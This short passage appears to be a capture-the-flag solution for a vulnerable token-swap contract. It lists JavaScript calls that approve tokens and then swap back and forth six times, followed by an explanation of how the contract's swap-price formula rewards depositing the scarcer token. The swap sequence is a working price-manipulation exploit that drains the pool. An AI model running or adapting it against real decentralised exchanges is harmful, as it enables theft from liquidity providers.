```javascript
await contract.approve(contract.address, 1000)

await contract.swap(addr1, addr2, 10)

await contract.swap(addr2, addr1, 20)

await contract.swap(addr1, addr2, 24)

await contract.swap(addr2, addr1, 30)

await contract.swap(addr1, addr2, 41)

await contract.swap(addr2, addr1, 45)
```

Due to how the swap price is calculated, if we deposit a token type it has less of, the return we get is amplified. (e.g. the less of token A it has with respect to the other token B, the more token B we can get from depositing token A.)
